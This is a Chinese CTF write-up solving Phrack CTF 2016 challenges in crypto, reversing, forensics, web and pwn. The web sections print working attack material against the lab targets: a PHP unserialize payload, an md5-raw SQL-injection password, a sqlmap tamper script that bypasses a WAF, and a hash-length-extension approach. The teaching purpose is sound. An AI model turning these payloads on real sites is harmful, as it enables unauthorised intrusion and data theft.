# Phrack CTF 2016

## 说明
这比赛与其说是比赛，不如说是个训练赛，基本上都是经典题或者原题（或者原题改），但偶尔也有一些脑洞题，而且都挺……难的（死

做的情况的话，就一开始稍微好点，后面是全程被按着打，毫无还手之力。嘛……不过本来也就是抱着学习的心态，好像也没什么？不过感觉其他人并不是很积极，看来学校里对这个感兴趣的人还是太少了（帮学长安利时也深有体会）

这次学到了很多，算是稍微点出了一点二进制的技能点，之后要更加努力学习不同的姿势……

另外这份题作为训练赛其实并不合格，突出在毫无质量的 Web 和根本没有 PPC！可怜我最喜欢的两类题……

## 题解
### base64?[测试题]
看字符串就知道不像是 base64，之前做过一个比赛知道有个叫 base32 的东西，解出来一个十六进制串，直接转成字符串就能得到 flag 了。

### 关于USS Lab.[测试题]
Rules 最后有图片。

### veryeasy[测试题]
strings 命令。

### 段子[测试题]
百度。

### 手贱[测试题]
其实蛮有意思的一个题。可以看出多了一位，我的做法是生成了 33 个字符串，在 cmd5 上直接批量解密。

### 美丽的实验室logo[测试题]
想都不想上 Stegsolve，看到第二帧图片就是。

### veryeasyRSA[测试题]
打开 RSAtool，把参数丢进去算。（我不会 RSA）

### 神秘的文件[测试题]
$ file haha.f38a74f55b4e193561d1b707211cf7eb

haha.f38a74f55b4e193561d1b707211cf7eb: Linux rev 1.0 ext2 filesystem data

mount一下就好了吧，我都忘了……

### 公倍数[测试题]
是个数学题，Y / 3 + Y / 5 - Y / 15 就是答案。

### Easy Crackme[测试题]
扔 IDA 就行。

![easy_crackme1](https://raw.githubusercontent.com/CTF-Mare/my-ctf-writeups/master/2016-05-21-PhrackCTF/screenshots/easycrackme1.png)

![easy_crackme2](https://raw.githubusercontent.com/CTF-Mare/my-ctf-writeups/master/2016-05-21-PhrackCTF/screenshots/easycrackme2.png)

逻辑很简单，照着抄一下扔进 python 里解就好了。

### Secret
固定套路题，在响应头里有一个 Secret。

### 爱吃培根的出题人
培根加密，找个网站弄弄或者手解都可以

### Easy RSA
直接分解 N 后套公式解，或者 RSAtool...（我不会RSA * 2）

### ROPGadget
[用网站](https://defuse.ca/online-x86-assembler.htm)

### 取证

[看这个](http://bobao.360.cn/ctf/detail/159.html)

### 熟悉的声音
真的完全不知所云，关键是我问了周围一圈人，都不知道那个神盾局特工的提示是在说什么。我已经忘了这个题怎么做的了，依稀记得好像是摩斯电码…………突然开脑洞想出来的

### Baby's Crack

跟 easy crackme 一个套路的题。扔 IDA 分析下即可。解密程序见附录。

### Help!!
真不记得了，回头我再想想……（捂脸

### Shellcode
转成汇编看看可以知道是个 Windows 的 Shellcode。直接调用就弹框了。

### PORT51
竟然是个 Web 题……curl 一下就好了。我依稀记得我是上我的 VPS 上 curl 的，因为我不知道 mac 下能不能开 51 端口orz……

### LOCALHOST
mdzz，这题竟然比上面那个题高分……一看就知道用了 PHP 经典的那个判断来源 IP 的函数。burp 加个头就行。

### Login
看响应头有提示，它的查询语句是这样的：

```"select * from `admin` where password='".md5($pass,true)."'"```

md5 函数加 true 是个灰常经典的漏洞点了（个人感觉更像是个 CTF 点，因为正常网站我就没见过有用这个指令的……），用 129581926211651571912466741651878684928 这个密码就行。

### Medium RSA
RSAtool（被打死）。256 位的 RSA 密码是不安全的，直接暴力跑就好了。（不会 RSA * 3）

### BrokenPic
不容易的题，但东西挺有规律的，想了想感觉经过了个什么东西加密，稍微搜搜就搜到了用 ECB 加密会有这种情况。[这个工具](https://doegox.github.io/ElectronicColoringBook/)可以方便地解决这类问题。

顺便一提我是在出提示前做的这个题，所以我试了好多种可能性，但感谢伟大的二维码的纠错能力，最后我硬是用个 ratio 完全不对的图解出来了……

### 上帝之音
原题：ACTF 2015 4G Radio

作为比赛出题人之一，我长期卡的两个题竟然都是在比赛里出现过的，足以见得我当时是有多懒，只管自己出题，不管别人搞事……反正就是读取波形，然后按照高-低或低-高编码为1，反之为0，然后就直接当二进制写进文件后尝试能不能读……

处理的 py 脚本放在附件里。

### FindKey
file 出来的结果不对（DBase 3是什么嘛...），用十六进制编辑器打开可以见到 raw_input 的字样，猜想是 pyc，直接跑了一下果然。找个逆向工具直接逆成原始 python 脚本就好了，然后再逆着做操作，输出结果，完事。

最终的 py 脚本放在附件里了。

### Confused ARM
原题：ACTF 2015 ????

反正原题是 ACTF 里的一个 ARM 题。似乎是 STM32 的板子上的题，先将 HEX 转成 BIN，然后根据开头的地址和最低位调整模式和入口地址，然后就是 IDA 技术活。这个题我是问了大牛的，感觉就是逆的暗无天日……不是很懂你们二进制orz……

### Tell Me Something
最简单的 pwn 题，直接修改返回地址到题目里藏的函数就好了。

利用脚本在附件里。

### Smashes
原题：32C3 CTF 2015

核心原理是 stack canary protection 的 info leak 问题，导致可以利用错误信息 leak 出我们构造的信息。具体[在这里](https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/pwn/readme-200)有很详细的描述了。但比赛时的 docker 据说配错了，以致于 stderr 的东西直接返回了（我猜想是直接把整个输出都导出了……），于是这题直接 leak 就行了，不用改环境变量了……

### 炫酷的战队logo
我不太记得了，后补……反正应该不难吧……

### Classical Crackme
.net 写的 Crackme，掏出 Reflector 就是一阵搞，虽然是混淆过了，但是字符串没有，直接就能看到核心部分代码：

```
  private void check(object, EventArgs)
{
    string s = this.check.Text.ToString();
    string str2 = Convert.ToBase64String(Encoding.Default.GetBytes(s));
    string str3 = "UENURntFYTV5X0RvX05ldF9DcjRjazNyfQ==";
    if (str2 == str3)
    {
        MessageBox.Show("注册成功！", "提示", MessageBoxButtons.OK);
    }
    else
    {
        MessageBox.Show("注册失败！", "提示", MessageBoxButtons.OK, MessageBoxIcon.Hand);
    }
}
```

### 神盾局的秘密
300 分的 Web 题……（哽咽，我这辈子好多年不见 300 分的 Web 题这么简单了

打开没啥东西，看到一个 showimg.php，后面是个 base64 编码的东西，解码是 shield.jpg，那当然是试试能不能直接读 php 啦。结果当然是可以的……

index.php:

```
<?php 
	require_once('shield.php');
	$x = new Shield();
	isset($_GET['class']) && $g = $_GET['class'];
	if (!empty($g)) {
		$x = unserialize($g);
	}
	echo $x->readfile();
?>
<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
```
shield.php:


```
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
?>

```

因为 $x 会被反序列化覆盖，直接构造一个 class 覆盖掉，再 readfile 就轻松随意了：

```
O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}
```

如果不熟悉格式的话，直接复制代码，自己跑一下，给对象赋好值再序列化输出就是了。


pctf.php：

```
<?php 
	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
	//Fake flag:
	echo "FLAG: PCTF{I_4m_not_fl4g}"
?>
```
这个Ture...这个假flag...（尴尬

### IN A Mess

两层题，第一层注释有提示 index.phps

```
<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
	header('Location: index.php?id=1');
	exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
	echo 'Hahahahahaha';
	return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
	require("flag.txt");
}
else
{
	print "work harder!harder!harder!";
}


?>
```

构造毫无难度，自己试试就好了。要点的话，首先 $id 有一万种方法绕过去，例如 0x0。$a 的话，那个 stripos 我猜可能是防止读什么设备？反正一个 php://input 就完事了。$b 的话，eregi 是可以正则的……

绕过后得到一个东西，以为是flag，结果是第二关，干……第二关啥都没有，只有一个 hi666。换了个 id，发现提示一个 SQL 注入语句。随便试了试注入，结果发现提示 you bad boy/girl！不过经典的一些注入又没问题，看来是有手写的 waf。

掏出 sqlmap 试了试，发现总是不行，打开 debug 等级 6，发现还判断了是不是 sqlmap 在扫描，是的话直接输出错误信息。靠……我就是要 sqlmap 怎么了！打开 sqlmap 伪装浏览器的开关，能够正常扫描了。

下面就是绕过 waf。测试了一下，在 id = 1 的情况下，只要 sql 语句 true，就能输出 hi666，否则输出一个 sql 语句。过滤方面的话，已知过滤了空格、```/**/```，用```/***/```绕就好了（……），似乎还过滤了select之类的东西。但是用SEselectLECT之类（或者直接大写？）的方法能绕过去，反正花样绕就好了。我的 tamper：

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import random
import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload
    keywords = ("UNION", "SELECT", "INSERT", "UPDATE", "FROM")

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/***/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/***/"
                continue

            retVal += payload[i]

        for keyword in keywords:
            _ = random.randint(1, len(keyword) - 1)
            retVal = re.sub(r"(?i)\b%s\b" % keyword, "%s%s%s" % (keyword[:_], keyword.lower(), keyword[_:]), retVal)

    retVal = retVal.replace("0x20", "32")

    return retVal
```
直接扫就好了。

顺带一提一开始我多加了个WHERE，但它WHERE是不过滤的，所以我一度以为只能用时间盲注，盲了半天猜不出列名，非常尴尬，最后搞定的时候发现。。。content和context。。。。。。。。。

无语凝噎，都不知道是故意的还是英语太差……

### Smali
不是太记得了，我记得我是不是直接找了个什么工具逆成 Java 看的？反正直接看也能看出来，AES 加密什么的……

### RE?
原题：ISCC 2014 首次会盟

干，这个题的题解说的是 SWPU2012 的陈题，这是几年陈了啊？没提示的话根本不知道是什么，幸好文件名还给了提示，懵逼.jpg

[点这里](http://drops.wooyun.org/papers/2419)看题解。

### Classical CrackMe2
跟1一样同样混淆过了，不过是经过字符串加密的，Reflector 解出来一塌糊涂。用经典的工具先稍微修饰一下，再用 ConFuserEx Strings Decryptor 对字符串加密部分做解密，得到以下代码：

```
private void button_0_Click(object sender, EventArgs e)
{
    string text = this.textBox_0.Text;
    string str2 = smethod_0(text);
    if ((text != "") && (str2 == "x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk="))
    {
        MessageBox.Show("密码正确！FLAG就是你输入的东西", "成功", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }
    else
    {
        MessageBox.Show("密码错误！" + str2, "失败", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        this.textBox_0.Text = "";
    }
}

public static string smethod_0(string string_0)
{
    byte[] bytes = Encoding.UTF8.GetBytes("pctf2016pctf2016pctf2016pctf2016");
    byte[] inputBuffer = Encoding.UTF8.GetBytes(string_0);
    RijndaelManaged managed = new RijndaelManaged {
        Key = bytes,
        Mode = CipherMode.ECB,
        Padding = PaddingMode.PKCS7
    };
    byte[] inArray = managed.CreateEncryptor().TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
    return Convert.ToBase64String(inArray, 0, inArray.Length);
}

```

随便解解就好了

### Backdoor
靠，不是很懂哪里来的后门……这程序就是自己在溢出自己。IDA 逆向后发现给定一个参数，然后对0x6443 做异或后会填写对应数量的0，反正就跟 pwn 的时候做 padding 差不多。算出个数后倒回去就是了。

### hard RSA
公钥里的 N 跟 medium RSA 一样，但指数变成了 2。

解法的话要从 RSA 公式下手：原文 ^ 公共指数 mod N -> 密文，所以对密文开根号就行。

当然开根号不能直接开，而要在之前得到的 P 和 Q 的模下开，再用中国剩余定理算出答案就行。

### SCAN
我把 ICMP 包逐个交了一遍。

### A Piece Of Cake
看上去像是凯撒密码，CrypTool直接分析，人肉纠错。

### Class10
十六进制打开文件发现看上去是 PNG 但没了 PNG 头，修复了一下打开是个假 flag。

其实别修复了，直接 binwalk 就好了，会找到一个奇怪的 zlib 区块，里面是个 29 * 29 长度的 01 字符串，搞成矩阵发现是个二维码。

### 取证2
用上面提到的取证神器看看屏幕，发现 truecrypt，用 Passware Kit Forensic 直接跑跑就出来了。

### Fibonacci
我就知道这个数列算了没用……

用了 jar2exe 来加密，实际上是个 java 程序（我一开始跑了好久跑不起来，后来才发现要 64 位的 JRE……），尝试挂了个小工具抓 class，只能抓下来核心程序：

```
package top.phrack.ctf.Fibonacci;

import java.io.PrintStream;
import java.util.Scanner;

// Referenced classes of package top.phrack.ctf.Fibonacci:
//            b

public class Fibonacci
{

    public Fibonacci()
    {
    }

    private static void heheda()
    {
        String bb = new String(b.x);
        String cb = new String(b.y);
        String m = hello(cb, bb);
    }

    public static void main(String args[])
    {
        System.out.println("\u6765\u8BA9\u6211\u4EEC\u73A9\u4E00\u4E2A\u6570\u5217\u6E38\u620F\uFF1A");
        System.out.println("a[0]=0,a[1]=1");
        System.out.println("a[2]=1,a[3]=2");
        System.out.println("a[4]=3,a[5]=5");
        System.out.println("..............");
        System.out.println("\u8BF7\u8BA1\u7B97a[100000000000000]\uFF1A");
        Scanner scan = new Scanner(System.in);
        String read = scan.nextLine();
        read = read;
        System.out.println("\u7B54\u6848\u9519\u8BEF\uFF01\uFF01");
    }

...

```
关键的要点在根本没被运行的 b 上，看来抓不到，得手脱了。OD 不支持 64 位程序，用了另外一个 64 位调试器，慢慢手脱就好（教程[在这里](http://reverseengineeringtips.blogspot.com/2014/12/unpacking-jar2exe-21-extracting-jar.html)）

最后抓出来后代回程序里就好了。代码在附件里。

### very hard RSA
给了一个 RSA，N 很大，但同时又给了两个 E 的加密结果，这就可以解出来了。

```
已知：
x^17 % N = A
x^65535 % N = B

假设也已知：
17a + 65535b = 1

则有：
x^17a * x^65537b = x

求出a, b就可以直接算出x

a, b可以用拓展欧几里德算
```

### flag在管理员手里
原题：？（忘了……反正是有原题的）

打开没什么信息，但注意到 cookie 里有 role 和 hsh，直接改没效果，看来 hsh 还要验证。随便试了试，果然有 index.php~，抓下来用 vim 还原一下：

```
<!DOCTYPE html>
<html>
<head>
<title>Web 350</title>
<style type="text/css">
        body {
                background:gray;
                text-align:center;
        }
</style>
</head>

<body>
        <?php
                $auth = false;
                $role = "guest";
                $salt =
                if (isset($_COOKIE["role"])) {
                        $role = unserialize($_COOKIE["role"]);
                        $hsh = $_COOKIE["hsh"];
                        if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
                                $auth = true;
                        } else {
                                $auth = false;
                        }
                } else {
                        $s = serialize($role);
                        setcookie('role',$s);
                        $hsh = md5($salt.strrev($s));
                        setcookie('hsh',$hsh);
                }
                if ($auth) {
                        echo "<h3>Welcome Admin. Your flag is 
                } else {
                        echo "<h3>Only Admin can see the flag!!</h3>";
                }
        ?>
        
</body>
</html>
~              
```
那个核心部分就是那个验证部分，用的是```md5($salt.strrev($_COOKIE["role"]))```，由于 role 我们可以控制，所以用哈希拓展攻击是可以的。用到的工具是 hash extender，[在这里](https://github.com/iagox86/hash_extender)查看。

不过 hash extended 要求知道前缀航渡，而我们不知道盐的长度，所以需要枚举。枚举的脚本在附件里。

### Extremely hard RSA
原题：PlaidCTF 2012 Password Guessing

呃……没什么了。[看这个](http://mslc.ctf.su/wp/plaidctf-2012-rsa-200-password-guessing/)题解就好了。不过要跑好久啊……

### God Like RSA
原题：Plaid CTF 2014 rsa

呃……没什么了。[看这个](https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/rsa)题解就好了。不过直接解解不开，弄了好久才找到一个叫 [OAEP](https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding) 的东西。RSA 真是博大精深呀……

### Guess
原题：Hack.lu 2014 CTF Guess the Flag

[题解](http://www.rogdham.net/2014/10/23/hacklu-2014-ctf-guess-the-flag-write-up.en)。很是学习了一下负数的姿势，原来还能这么弄的，十分长见识……

我的猜测脚本在附件。

### Guestbook2
原题：0CTF 2015 freenote

[题解](https://kitctf.de/writeups/0ctf2015/freenote/)。

逆向部分要先猜出结构：

```
00000000 note_struct     struc ; (sizeof=0x1810, mappedto_3)
00000000 total           dq ?
00000008 count           dq ?
00000010 notes           note_node 256 dup(?)
00001810 note_struct     ends
00001810
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 note_node       struc ; (sizeof=0x18, mappedto_4) ; XREF: note_struct/r
00000000                                         ; struc_5/r
00000000 isValid         dq ?
00000008 length          dq ?
00000010 content_pointer dq ?                    ; offset
00000018 note_node       ends
00000018
```

然后大部分东西就都清晰了，就是 double free 了。关于 double free，我稍后会再写一篇文章，[乌云上](http://drops.wooyun.org/binary/7958)也有一篇，但我个人感觉讲的并不清楚。

## 不会的题
### JarvisShell
是个 Atmel AVR 指令集的程序，但直接用虚拟机跑是跑不起来的，可能还是在板子上才跑得起来，十分诡异。由于比赛的时候马上要出国了，没来得及看完指令集，也就没逆……

### CrazyAndroid
用 360 加固的一个程序。在网上找到了用实机脱的方法，但 TM 我用着 mbp 和 iPhone，根本没有安卓设备，于是雪崩。还好就这么一个安卓题，一道我都做不出来……（尴尬